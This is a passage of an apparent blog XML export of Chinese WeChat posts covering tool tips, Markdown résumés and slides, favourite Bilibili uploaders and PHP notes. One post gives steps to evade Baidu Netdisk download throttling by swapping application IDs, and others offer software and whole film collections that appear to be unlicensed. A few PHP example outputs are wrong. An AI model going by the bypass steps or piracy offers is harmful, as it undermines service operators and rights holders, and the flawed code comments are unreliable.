搜索freedom可以找到在电影《勇敢的心》1小时54分出现。 知识提取搜索引擎http://magi.com/ 这个不同于百度谷歌， 搜索 pgone 有亮点。 马云模拟器https://lemonjing.com/ 在马云模拟器，你可以体验花光马云的2700多亿是什么感觉，买起来吧 。 举牌小人举牌小人来自一个台湾插画家设计，http://upuptoyou.com/ 提供生成这种图片服务。如果比较慢，可以使用国内的 http://1.hus.tcapps.twocola.com/ 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些我关注的 b 站 up 主 那些我常听的中文播客节目 2019年11月最新使用油猴加速百度网盘下载方法 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用 Markdown 来写简历和 PPT]]></title>
    <url>%2F2019%2F12%2F03%2F%E7%94%A8-Markdown-%E6%9D%A5%E5%86%99%E7%AE%80%E5%8E%86%E5%92%8C-PPT%2F</url>
    <content type="text"><![CDATA[之前写过 markdown 的使用我是如何用 Markdown 写公众号文章的 ，强烈建议你花10分钟学学markdown，那时候你才知道原来写作可以如此顺畅。 除了网页版 markdown 编辑器， 这里推荐一款非常好用的支持实时预览的markdown客户端软件 Typora ，它支持 Windows mac Linux等系统，能自动保存，不用担心写好的文档丢失，导入文件格式支持.docx, .latex,.epub等，导出文件格式支持 PDF，HTML等格式，如果要导出LaTeX格式需要安装 Pandoc 插件。 软件下载地址 https://github.com/typora https://www.typora.io/ 。 使用markdown语法编辑（非常易学）。退出源代码模式可以显示效果（可以看到字体加粗了），最后保存文件名后缀为.md，然后可以直接用Typora打开。 比如我之前用一个工具将 MySQL 表结构生成 Markdown 文件https://learnku.com/articles/36523 然后将markdown文件导出为PDF 效果如图，左侧还有目录结构，是每个表的表名。 markdown文件还可以导出为HTML，这样可以直接复制到微信公众号发布，当然这有点麻烦，还是建议使用 https://mdnice.com/ 这样的在线工具。 导入文件需要 pandoc插件支持 https://pandoc.org/installing.html markdown简历学会了markdown，就可以用来写简历了，比如之前写过的那些你可能用得上的简历写作工具 ，这里推荐一个非常好用的在线markdown工具 http://resumd.t9t.io/ ，可以自定义样式(GitHub theme, timqian.com theme, TUI theme)，最后导出为md PDF 或者HTML。 比如我之前的文章 公众号苏生不惑原创文章整理 copy到这里。导出为resume.md，然后用 Typora 打开。导出为HTML格式，用浏览器打开。导出为PDF ，用浏览器打开。最后将写好的简历分享出来发给别人看。如果遇到问题可以到 https://github.com/timqian/resumd/issues 提问。 Markdown 文档转成高大上 PPT累死累活干不过做 PPT 的，那就将markdown转为PPT吧，推荐一款能将 Markdown 文档转成高大上 PPT 的开源工具，支持图表、流程图、数学符号、自定义主题配色以及样式等 https://github.com/ksky521/nodeppt https://nodeppt.js.org/#slide=1 直接按方向键翻页，和使用office一样。使用方法很简单12345678910111213npm install -g nodeppt # create a new slide with an official template$ nodeppt new slide.md# create a new slide straight from a github template$ nodeppt new slide.md -t username/repo# start local sever show slide$ nodeppt serve slide.md# to build a slide$ nodeppt build slide.md 类似的还有 https://eloc.now.sh/ https://badgen-5min.now.sh/https://github.com/amio/eloc https://github.com/hakimel/reveal.js ，我之前也写过 ppt 神器 reveal ，我还做个了周杰伦的在线个人PPT https://sushengbuhuo.gitee.io/blog/jay/#/start 。 最后推荐一个 Markdown 的表格格式在线生成工具，图形化操作，一键生成，可以生成 Letex、HTML Table、MediaWiki 等，有点意思，可以玩玩 https://www.tablesgenerator.com/ 其他在线简历 https://resume.mdnice.com/Typora 完全使用详解 https://sspai.com/post/54912推介一个不错的在线公式、图形编辑生成器，可以在线转化为 SVG、Letex 格式，方便的插入支持 Letex 的 Markdown 编辑器中，在支持的编辑器前后加上 $$ 即可，附上我在 Typora 中画的一个公式～ https://www.mathcha.io推介一个炫酷的字符码图在线生成工具，附上我自己画的一个 Nodejs 事件循环机制图～ http://asciiflow.com/让 Markdown 写作更简单，免费极简编辑器 https://sspai.com/post/30292使用 Pandoc 与 Markdown 生成 PDF 文件 https://jdhao.github.io/2017/12/10/pandoc-markdown-with-chinese/https://github.com/jgm/pandoc/wiki/Pandoc-With-Chinese-(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)https://www.bbsmax.com/A/A7zgplD1J4/https://www.bajins.com/Other/Markdown%E5%B7%A5%E5%85%B7.html#微信公众号排版 http://cv.ftqq.com/#简历https://github.com/geekcompany/DeerResume使用 Markdown 制作漂亮的在线简历 https://bigliao.github.io/markCV/ https://github.com/BigLiao/markCV简历https://github.com/timqian/resumd一款 Markdown 语法排版简历的工具 https://github.com/mdnice/markdown-resumehttps://openwrite.cnhttps://www.mdnice.com/http://blog.didispace.com/tools/online-markdown/https://md.phodal.com/http://md.codingpy.com/http://js8.in/mpeditor/公众号排版 https://github.com/didadi599/wechat-markdown-editor通过导入json、csv、excel、html table生成Markdown表格，一个写博客必备神器 https://tableconvert.com/一款基于 Vue、Vditor，为未来而构建的在线 Markdown 编辑器；轻量且强大：内置粘贴 HTML 自动转换为 Markdown，支持流程图、甘特图、时序图、任务列表，可导出携带样式的图片、PDF、微信公众号特制的 HTML 等等。 https://markdown.lovejade.cn/export/pdf/ https://www.lovejade.cn/zh/works/ 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些我关注的 b 站 up 主 那些我常听的中文播客节目 2019年11月最新使用油猴加速百度网盘下载方法 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019年11月最新使用油猴加速百度网盘下载方法]]></title>
    <url>%2F2019%2F11%2F29%2F2019%E5%B9%B411%E6%9C%88%E6%9C%80%E6%96%B0%E4%BD%BF%E7%94%A8%E6%B2%B9%E7%8C%B4%E5%8A%A0%E9%80%9F%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[百度网盘是目前最好的文件存储和分享工具了，之前已经写过那些你可能不知道的百度文库/网盘快速下载工具没有提取码怎么获取百度网盘资源？常用的网盘下载方法如 pandownload 已经失效了，这里分享一种最新可加速下载的方法（速度可达6MB/s），就是油猴+IDM了，很简单，下面看看怎么用吧。 idmInternet Download Manager是一个用于Windows系统的多线程下载神器，能将下载速度提高最多5倍，支持所有主流浏览器，几乎能下载网页中的所有数据，包括视频、音频，图片等。 先下载idm软件（在公众号回复 idm 获取软件）后会直接安装好Chrome扩展。在谷歌浏览器扩展程序 chrome://extensions/ 里开启idm扩展。 页面上右键就可以看到idm下载按钮了。 点击下载会启动IDM软件下载文件。比如下载我之前的文章 那些我常听的中文播客节目 中的音频。 油猴扩展油猴脚本 Tampermonkey 是一款免费的浏览器扩展和流行的用户脚本管理器，它适用于 Chrome, Microsoft Edge, Safari, Firefox等主流浏览器。如果你还没用过油猴，可以看看之前的文章Chrome 浏览器扩展神器油猴 ，油猴Chrome扩展地址 https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN 下载Chrome 扩展需要先上谷歌，公众号内回复 谷歌 获取方法，也可以回复 油猴 获取扩展crx文件，然后将扩展文件拖进扩展程序，如果遇到问题比如提示 该扩展程序未列在 Chrome 网上应用店中，并可能是在您不知情的情况下添加的或者程序包无效。 先把文件后缀.crx 改成 .rar，然后解压得到一个文件夹，再打开chrome://extensions/ 谷歌扩展管理，点击右上角的开发者模式，就可以看到加载已解压的扩展程序，选择刚才解压好的文件夹，确认新增扩展程序就安装好了油猴扩展（安装其他扩展类似）。 安装完后右上角就有油猴按钮了。 网盘助手脚本有了油猴还需要安装对应的脚本，这个大概是目前最优雅好用的网盘助手脚本了，脚本主要功能有：123[1]百度网盘、腾讯微云、蓝奏云万能钥匙[2]百度网盘生成并展示下载链接 [3]百度网盘分享时自定义提取码 脚本地址https://greasyfork.org/zh-CN/scripts/378301-%E7%BD%91%E7%9B%98%E5%8A%A9%E6%89%8B点击这里安装，我已经安装过了所以显示重新安装。安装后打开这个网盘链接 https://pan.baidu.com/s/1EgMaezKmv6ofH77F2DvsDw 不用自己输入提取码了，它会自动帮你填写。 分享文件时还可以自定义提取码，比如 8866，我这里生成了一个分享链接https://pan.baidu.com/s/1MDv3mdhjRF65_sp20dhAnQ 提取码: 8866 下载网盘文件有了idm和油猴就可以开始下载文件了，这里下载周星驰的电影《唐伯虎点秋香》（想获取周星驰所有电影回复周星驰）打开你的网盘主页 https://pan.baidu.com/disk/home ，如果是别人分享的文件，先保存到自己网盘，然后选中文件，点击生成链接会生成一个mkv地址 https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E7%94%B5%E5%BD%B1%2F%E5%91%A8%E6%98%9F%E9%A9%B0%E7%94%B5%E5%BD%B1%2F%E5%94%90%E4%BC%AF%E8%99%8E%E7%82%B9%E7%A7%8B%E9%A6%99.mkv&amp;filename=%E5%94%90%E4%BC%AF%E8%99%8E%E7%82%B9%E7%A7%8B%E9%A6%99.mkv 然后右键使用idm下载。弹出IDM软件下载框看看下载速度，最高可达6.3MB/s400MB的文件不到2分钟下载完。如果出现 HTTP/1.1 403 无权限下载错误，在弹出的窗口里修改应用 ID 为 778750， 具体见http://pan.newday.me/script/option.html。如果 778750 也不行，换 265486、309847 或 266719。 再对比下使用百度网盘客户端下载速度99kB/s ，速度快了几十倍。 好了，油猴赶快用起来吧，如果有问题在文末可以留言。 其他3个方法解决百度网盘限速 https://www.runningcheese.com/baiduyun https://www.baiduyun.wiki/zh-cn/assistant.htmlhttp://pan.newday.me/下载工具：https://www.lanzous.com/b0ug2rrc下载 xdown https://xdown.org/ 百度网盘下载助手https://greasyfork.org/zh-CN/scripts/390707Aria2下载助手纯净无广告 配合aria2使用 百度网盘满速下载 哔哩哔哩下载和解除港澳台区域限制https://greasyfork.org/zh-CN/scripts/390707-aria2%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B【下载速度】理论速度100/8=12.5M/s,限速后下载速度在5kb~50kb浮动如果出现 HTTP/1.1 403 错误，尝试将应用 ID 修改为： 778750。如何修改应用 ID 呢？打开 http://pan.newday.me/script/option.html，在弹出的窗口里修改。如果 778750 也不行的话，尝试 265486、309847 或者 266719。亿寻 百度网盘不限速下载 https://www.52pojie.cn/thread-1055417-1-1.html最新发现的百度网盘下载https://www.52pojie.cn/thread-1050407-1-1.html网盘助手chrome 扩展地址https://chrome.google.com/webstore/detail/%E7%BD%91%E7%9B%98%E5%8A%A9%E6%89%8B/cfaglmggimoleoclaghmmboppofffdda推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些我关注的 b 站 up 主 那些我常听的中文播客节目 双十一防虚假促销套路，先查询下商品历史价格 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无套路，公众号 苏生不惑 抽奖送现金红包]]></title>
    <url>%2F2019%2F11%2F27%2F%E6%97%A0%E5%A5%97%E8%B7%AF%EF%BC%8C%E5%85%AC%E4%BC%97%E5%8F%B7-%E8%8B%8F%E7%94%9F%E4%B8%8D%E6%83%91-%E6%8A%BD%E5%A5%96%E9%80%81%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%2F</url>
    <content type="text"><![CDATA[抽奖在文末 最近公众号来了不少新关注，有些人可能对我不了解，我目前在北京新浪工作，关于新浪可以看看我之前的文章 我的新浪工作日常 公众号陆陆续续更新了近70篇原创文章，连续坚持了半年每周更新2-3篇，也是不容易，之前10月份还整理过一次 公众号苏生不惑原创文章整理 这里再整理下10月后的原创文章。 那些我常用的 Chrome 扩展 那些我常用的 Chrome 扩展（二） 那些你可能不知道的百度产品 那些你可能不知道的腾讯产品 那些在国内还能使用的谷歌产品 那些你可能需要的图片处理工具 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 2019 双十一京东全民养红包攻略分享 跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌 如何快速找到电子书《明朝那些事儿》？ 周末推荐几个好用的免费在线看电影网站 双十一防虚假促销套路，先查询下商品历史价格 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 好，下面开始说重点了，之前双十一在知识星球和微信群里发了次抽奖，就是抽一个66.66现金。然后微信群友 没见过鱼的北方人 喜中了。 我建议他去买个彩票。 好了，下面就是今天的活动抽奖，抽8人每人18元现金红包，开奖后可以直接提现到微信秒到账，下面是我昨天提现的。 邀请好友还能增加中奖率。 另外在本公众号文章下面留言，点赞数前10，每人6.6现金红包（加我微信发送，截止时间11月17号20点）。 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[现在做公众号还赚钱吗？辛苦坚持2个月才赚了120]]></title>
    <url>%2F2019%2F11%2F27%2F%E7%8E%B0%E5%9C%A8%E5%81%9A%E5%85%AC%E4%BC%97%E5%8F%B7%E8%BF%98%E8%B5%9A%E9%92%B1%E5%90%97%EF%BC%9F%E8%BE%9B%E8%8B%A6%E5%9D%9A%E6%8C%812%E4%B8%AA%E6%9C%88%E6%89%8D%E8%B5%9A%E4%BA%86120%2F</url>
    <content type="text"><![CDATA[话说现在几乎人手一个公众号了，我的号很早就开通了，但一直没怎么运营过，如果不是这次微信把流量主门槛从5000降低到500，可能我都没有动力继续更新。 微信把门槛放低了，所以为了赚钱（就是这么实在，大家也都这样吧，哈哈），我保持每周至少更新2篇文章，从5月开始到现在，已发布20篇文章。 其中17篇为原创，奇技淫巧系列是我耗费时间最多，也认为写的最好的文章。 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的知乎奇技淫巧 终于功夫不负有心人，6月底的时候有人找上我来投放广告。 是一个叫万门大学的教育机构，他们只给了120，虽然很少，但至少是个好的开始,于是我就接下了。 文章给对方预览好后还没推送就到账了，果然很实诚。 于是我就推送了第一个公众号广告，就是这篇文章了 。我们计划招收300名学员，免费攻读人工智能专业 公众号的红利期已经过去，你还在坚持写公众号吗？ ps:不知道除了接广告，大家还有什么途径赚钱的。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[周星驰电影全集分享]]></title>
    <url>%2F2019%2F11%2F26%2F%E5%91%A8%E6%98%9F%E9%A9%B0%E7%94%B5%E5%BD%B1%E5%85%A8%E9%9B%86%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[周星驰，从星仔到星爷，如雷贯耳，当之无愧的喜剧之王，相信不用多介绍了。 1990年凭借喜剧片《一本漫画闯天涯》确立其无厘头的表演风格 ；同年，因其主演的喜剧动作片《赌圣》打破香港地区票房纪录而获得关注 。1991年主演喜剧片《逃学威龙》，并再次打破香港地区票房纪录 。1995年凭借喜剧爱情片《大话西游》奠定其在华语影坛的地位。1999年自导自演的喜剧片《喜剧之王》获得香港电影年度票房冠军 。 参演电影都是经典之作https://movie.douban.com/celebrity/1048026/ 很多电影陪伴了我枯燥的中学生涯，感谢星爷这些作品，这里也给大家分享下他曾经的那些代表作。 公众号回复 周星驰 获取电影，包括《唐伯虎点秋香》《功夫》《百变星君》《整蛊专家》《大话西游》《喜剧之王》《鹿鼎记》《国产凌凌漆》《鹿鼎记》《大内密探零零发》《少林足球》《逃学威龙系列》等几十倍电影。 另外发个福利，无套路现金红包抽奖 ，抽8人每人18元现金红包，开奖后可以直接提现到微信秒到账。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 双十一防虚假促销套路，先查询下商品历史价格 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些我关注的 b 站 up 主]]></title>
    <url>%2F2019%2F11%2F21%2F%E9%82%A3%E4%BA%9B%E6%88%91%E5%85%B3%E6%B3%A8%E7%9A%84-b-%E7%AB%99-up-%E4%B8%BB%2F</url>
    <content type="text"><![CDATA[关于b站之前写过 那些你可能不知道的 bilibili 奇技淫巧 ，b站是我每天都要逛的网站，也关注了不少有趣的up主，这里做个整理。那些比较知名的up主，如《李子柒》《电影最Top》《野食小哥》《我是郭杰瑞》《木鱼水心》《李永乐老师》这些百万up主就不说了。 大象放映室解说电影up主，b站主页 https://space.bilibili.com/49246269/ 女主播声音很好听。虽然发布的视频不多，但都是精品，比如章子怡的《我的父亲母亲》，李安《少年派》。类似的电影解说up主还有 电影talks https://space.bilibili.com/319751089/ 影视摆渡人 https://space.bilibili.com/386002045/ 这位up主解说的段奕宏，俞飞鸿电影《爱有来生》太唯美了（公众号回复爱有来生获取电影），文字功底太强了 https://www.bilibili.com/video/av73324690 回形针回形针PaperClip，你的当代生活说明书，b站主页 https://space.bilibili.com/258150656/ ，发布各种科普视频，比如手机充电为什么这么慢，买彩票一定亏吗？他们还有一个百科全书性质的网站 https://ipaperclip.net/最近还发布一个第一百期节目的解密游戏https://www.bilibili.com/video/av75572775 ，知乎回答https://www.zhihu.com/question/355722223/answer/893812403 柴知道知识科普up主，带你在知识的海洋里狗刨，b站主页https://space.bilibili.com/26798384/主要发布那些你不知道的知识的科普视频。 汤质看本质这是一个让你感觉自己一无所知的up主，视频有点烧脑，b站主页https://space.bilibili.com/362588980/ 。 man影君战争电影剪辑up主，发布了近400个战争电影，b站主页https://space.bilibili.com/327567693/ 冒险雷探长《冒险雷探长》一档环球探索纪录片，走访失落的古迹，探索人类未解之谜，比如他最近更新的叙利亚视频，b站主页https://space.bilibili.com/49494871 。非洲食人族视频 窟眩视频自制全面战争记录片up主，战火与文明，杀戮与止战，古战场的恢宏攻伐，独特视角给您重现古战场，比如 山海关之战，楚汉风云，巨鹿之战等，b站主页 https://space.bilibili.com/5150024/video ，遗憾的是up主很久不更新了。 Runa-涉谷瑠菜一个在中国留学的日本妹子up主，主要发布在中国的一些趣闻，声音很好听，b站主页https://space.bilibili.com/456917891/ 最后如果你想下载b站视频，公众号回复 b站获取工具。 你关注了哪些有趣的up主，可以留言推荐下 ，我也关注一波。 其他是落拓呀 https://space.bilibili.com/43276908/梦回大明三百年 https://space.bilibili.com/66384210/超钱思维https://space.bilibili.com/271553616/幻想浅绿 https://space.bilibili.com/1424972/你在b站关注了哪些惊为天人的up主？ https://www.weibo.com/3305085281/IfYVr44kt电影不烧口 https://space.bilibili.com/84782178/越哥说电影 https://space.bilibili.com/149558293/ ​​​​ 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 双十一防虚假促销套路，先查询下商品历史价格 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 开发记录]]></title>
    <url>%2F2019%2F11%2F20%2Fphp-%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[错误处理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657try &#123; $a = 5 / 0;&#125; catch (Exception $e) &#123; $e-&gt;getMessage(); $a = -1; // 通过异常来处理 $a 为 0 的情况，但是实际上，捕获不到该异常&#125;echo $a;// PHP Warning: Division by zeroPHP7 开始统一这两者，使错误也可以像异常那样抛出PHP 中的错误可理解为 使脚本不运行不正常的情况，根据错误级别从高到低可划分为五类Parse error 或 Syntax Error - 语法解析错误，触发该错误后，脚本完全无法运行；Fatal Error - 致命错误，触发该错误后，后面的脚本无法继续执行；Warning Error - 出现比较不恰当的地方，脚本可继续执行；Notice Error - 出现不恰当的地方，但是程度比 Warning Error 低，脚本可继续执行；Deprecated Error - 不推荐这么使用，未来可能会废弃，脚本可继续执行；// E_ALL - 处理全部错误类型set_error_handler('customError', E_ALL);/** * @param int $errno 错误的级别 * @param string $errstr 错误的信息 * @param string $errfile 错误的文件名(可选) * @param string $errline 错误发生的行号（可选） */function customError(int $errno, string $errstr, string $errfile, string $errline)&#123; echo sprintf('错误消息为 %s', $errstr);&#125;当错误类型为 E_USER_DEPRECATED 时，需要添加 @@trigger_error("foo", E_USER_DEPRECATED);$a = 5 / 0; // 错误消息为 Division by zerofunction division($a, $b) &#123; if($b == 0)&#123; @trigger_error("0 不能作为除数", E_USER_NOTICE); return -1; &#125; return $a / $b;&#125;echo division(10, 0);开发环境推荐配置display_errors = Ondisplay_startup_error = Onerror_reporting = -1log_errors = On生产环境推荐配置display_errors = Offdisplay_startup_error = Off; 报告 Notice 以外的所有错误error_reporting = E_ALL &amp; ~E_NOTICElog_errors = Onhttps://learnku.com/articles/36521 对象的浅拷贝与深拷贝12345678910111213141516171819class Bar &#123; public $name;&#125;class Foo &#123; public $bar; function __construct() &#123; $this-&gt;bar = new Bar(); &#125;&#125;$foo = new Foo();$copyFoo = clone $foo;var_dump($foo-&gt;bar === $copyFoo-&gt;bar); // bool(true)克隆的实例与原有的实例的 bar 成员都指向同一个实例 https://github.com/myclabs/DeepCopyhttps://learnku.com/articles/36876 php数组123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100其他编程语言数组是由相同类型的元素（element）的集合所组成的数据结构，而 PHP 数组元素可以为不同类型的元素。因此说 PHP 数组不是纯粹的数组，而是哈希 (字典) 更为恰当.注意的是字符串类型假如是有效十进制数字的话，则会转换为整型. "8"-&gt;8. 若不想转换则在数字前添加 "+" 符号.// 02不是有效十进制数字$arr = ['1' =&gt; 'a', '+1' =&gt; 'b', '02' =&gt; 'c'];(array)$scalarValue 与 array ($scalarValue) 一样。而对象 (object) 类型转换为 array. 其单元为该对象的属性。键名将为成员变量名，不过有几点例外：整数属性不可访问；私有变量前会加上类名作前缀；保护变量前会加上一个 '*' 做前缀。这些前缀的前后都各有一个 NULL 字符。var_dump(array_fill(0, 0, 1)); // []var_dump(array_fill(1, 3, 'red')); // [1=&gt;'red', 2=&gt;'red', 3=&gt;'red']$a = ['a' =&gt; 1, 'B' =&gt; 2, 3 =&gt; 'c', 'A' =&gt; 4, 'b' =&gt; 6];print_r(array_chunk($a, 2)); // [[1, 2], ['c', 4], [6]]print_r(array_chunk($a, 2, true)); // [['a' =&gt; 1, 'B' =&gt; 2], [3 =&gt; 'c', 'A' =&gt; 4], ['b' =&gt; 6]]var_dump(array_slice($a, -1, 1, true)); [4 =&gt; 'f']print_r(array_count_value([1, 'hello', 1, 'hello', 'world'])) // [1=&gt;2, 'hello' =&gt; 2, 'world' =&gt; 1]var_dump(array_product([])); // 1var_dump(array_sum([])); // 0$a = ['a' =&gt; 1, 'b' =&gt; 2, 'c' =&gt; 3];var_dump(array_keys($a)); // ['a', 'b', 'c']var_dump(array_keys($a, '1')); // 'a'var_dump(array_keys($a, '1', true)); // []var_dump(array_rand([1, 2, 3], 2)); // [1, 3]var_dump(array_search(false, $a, true)); // falsevar_dump(in_array('1', $os, true)); // falsevar_dump(array_diff($array1, $array2, $array3)); // ['blue']$arr1 = ['color' =&gt; ['favorite' =&gt; 'red', 5]];$arr2 = ['color' =&gt; ['favorite' =&gt; 'green', 6, 7]];var_dump(array_merge_recursive($arr1, $arr2)); // ['color' =&gt; ['favorite' =&gt; ['red', 'green'], 5, 6, 7]]$arr1 = ['color' =&gt; ['favorite' =&gt; 'red', 5]];$arr2 = ['color' =&gt; ['favorite' =&gt; 'green', 6, 7]];var_dump(array_merge($arr1, $arr2)); // ['color' =&gt; ['favorite' =&gt; 'green', 6, 7]];var_dump($arr1 + $arr2); // ['color' =&gt; ['favorite' =&gt; 'red', 5]]$ar1 = [10, 100, 100, 0];$ar2 = [1, 3, 2, 4];array_multisort($ar1, $ar2); // [0, 10, 100, 100] [4, 1, 2, 3]array_multisort($ar1, SORT_DESC, SORT_NUMERIC, $ar2, SORT_ASC, SORT_NUMERIC); // [100, 100, 10, 0] [2, 3, 1, 4]// 排序针对的是值, 而且会保存原先索引$fruits = array("d" =&gt; "lemon", "a" =&gt; "orange", "b" =&gt; "banana", "c" =&gt; "apple");arsort($fruits);print_r($fruits); // ['a' =&gt; 'orange', 'd' =&gt; 'lemon', 'b' =&gt; 'banana', 'c' =&gt; 'apple']// 语言结构, 并非函数$info = ['coffee', 'brown', 'caffeine'];list($drink, $color, $power) = $info;echo "$drink, $color, $power"; // coffee, brown, caffeine// 可以省略不想取的list($drink, , $power) = $info;echo "$drink, $power"; // coffee, caffeine// 7.0 以上是从左到右赋值, 7.0以下是从右到左赋值list($a[0], $a[1], $a[2]) = $info;// 7.0 以上var_dump($a); // ['coffee', 'brown', 'caffeine']// 7.0 以下var_dump($a); // ['caffeine', 'brown', 'coffee']// 7.1 支持索引数组$info = ['a' =&gt; 'coffee', 'b' =&gt; 'brown', 'c' =&gt; 'caffeine'];list('a' =&gt; $drink, 'c' =&gt; $power) = $info;echo "$drink, $power"; // coffee, caffeine$a = [1, 2, 3];echo count($a); // 3$b = [$a, 4, 5, 6];echo count($b, COUNT_RECURSIVE) // 7$a = ['php', 4.0, ['green', 'red']];var_dump(array_reverse($a)); // [['green', 'red'], 7.1, 'php']var_dump(array_reverse($a, true)); // [2 =&gt; ['green', 'red'], 1 =&gt; 7.1, 0 =&gt; 'php']$sweet = ['a' =&gt; 'apple', 'b' =&gt; 'banana'];function testPrint($item, $key, $userData) &#123; echo "$key holds $item and $userData\n";&#125;/*** a holds apple and php* b holds banana and php* sour holds lemon and php*/array_walk_recursive($fruits, 'testPrint', 'php');function odd($var)&#123; return $var &amp; 1;&#125;// 自然排序, 以人们认知方式排序,区分大小写$arr = ['a1', 'A1', 'c2', 'c3', 'b4', 'b5', 'B1'];natsort($arr); // truevar_dump($arr); // ['A1', 'B1', 'a1', 'b4', 'b5', 'c2', 'c3']// 数字比较项目, 'a1' 转换数字为 0, 所以排序顺序如下$arr1 = ['a1', 0, 2, '1a'];sort($arr1, SORT_NUMERIC);var_dump($arr1); // ['a1', 0, '1a', 2]// 被作为字符串来比较$fruits = array("lemon", "orange", "banana", "apple", 1);sort($fruits, SORT_STRING);var_dump($fruits); // [1, 'apple', 'banana', 'lemon', 'orange']// 和 natsort() 类似对每个单元以“自然的顺序”对字符串进行排序$arr = ['a1', 'A1', 'c2', 'c3', 'b4', 'b5', 'B1'];sort($arr, SORT_NATURAL); // truevar_dump($arr); // ['A1', 'B1', 'a1', 'b4', 'b5', 'c2', 'c3']https://learnku.com/articles/36866 Base64 加密算法123456789101112131415161718192021222324252627282930313233https://gitee.com/obamajs/php-base64-implemention/blob/master/Base64.phpbase64 的作用是把任意的字符序列转换为只包含特殊字符集的序列每个 Base64 字符用 6 位来表示，但是一个字节是 8 位，所以 3 个字节刚好可以生成 4 个 Base64 字符，这应该很容易计算出来，下面我给大家举个例子，假如说现在有个字符串为 "123"，1 的 ASCII 为 49，那么转换为二进制就是 00110001，2 的 ASCII 为 50，那么转换为二进制就是 00110010，3 的 ASCII 为 51，那么转换为二进制就是 00110011，这三个二进制组合在一起就是这样：001100010011001000110011按照 4 个 Base64 字符转换为 3 个 8 位的字节算法就可以了，4 个字符组合起来就是 24 位，按照 8 位一个字节，就是三个字节。function normalToBase64Char($num)&#123; if ($num &gt;= 0 &amp;&amp; $num &lt;= 25) &#123; return chr(ord('A') + $num); &#125; else if ($num &gt;= 26 &amp;&amp; $num &lt;= 51) &#123; return chr(ord('a') + ($num - 26)); &#125; else if ($num &gt;= 52 &amp;&amp; $num &lt;= 61) &#123; return chr(ord('0') + ($num - 52)); &#125; else if ($num == 62) &#123; return '+'; &#125; else &#123; return '/'; &#125;&#125;function base64CharToInt($num)&#123; if ($num &gt;= 65 &amp;&amp; $num &lt;= 90) &#123; return ($num - 65); &#125; else if ($num &gt;= 97 &amp;&amp; $num &lt;= 122) &#123; return ($num - 97) + 26; &#125; else if ($num &gt;= 48 &amp;&amp; $num &lt;= 57) &#123; return ($num - 48) + 52; &#125; else if ($num == 43) &#123; return 62; &#125; else &#123; return 63; &#125;&#125;https://learnku.com/articles/36655 一致性 hash 算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899// 一致性哈希算法class ConsistentHashing&#123; protected $nodes = array(); //真实节点 protected $position = array(); //虚拟节点 protected $mul = 64; // 每个节点对应64个虚拟节点 /** * 把字符串转为32位符号整数 */ public function hash($str) &#123; return sprintf('%u', crc32($str)); &#125; /** * 核心功能 */ public function lookup($key) &#123; $point = $this-&gt;hash($key); //先取圆环上最小的一个节点,当成结果 $node = current($this-&gt;position); // 循环获取相近的节点 foreach ($this-&gt;position as $key =&gt; $val) &#123; if ($point &lt;= 